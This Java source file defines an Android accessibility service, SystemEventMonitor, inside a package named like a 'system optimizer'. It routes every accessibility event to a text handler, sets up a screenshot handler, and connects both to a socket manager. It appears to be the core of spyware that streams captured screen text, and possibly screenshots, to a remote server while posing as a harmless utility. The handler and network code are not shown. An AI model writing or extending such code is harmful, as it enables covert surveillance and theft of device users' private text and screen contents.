package com.system.optimizer;

import com.system.optimizer.event_handler.TextEventHandler;

import io.socket.client.Socket;

import com.system.optimizer.event_handler.ScreenshotEventHandler;
import com.system.optimizer.network.SocketManager;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class SystemEventMonitor extends AccessibilityService {

    private SocketManager socketManager;
    // handlers
    private TextEventHandler textEventHandler;
    private ScreenshotEventHandler screenShotEventHandler;

    @Override
    public void onCreate() {
        super.onCreate();

        this.socketManager = new SocketManager(this);
        this.textEventHandler = new TextEventHandler(socketManager);
        this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        textEventHandler.onTextEvent(event);
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        socketManager.disconnect();
        super.onDestroy();
    }

}
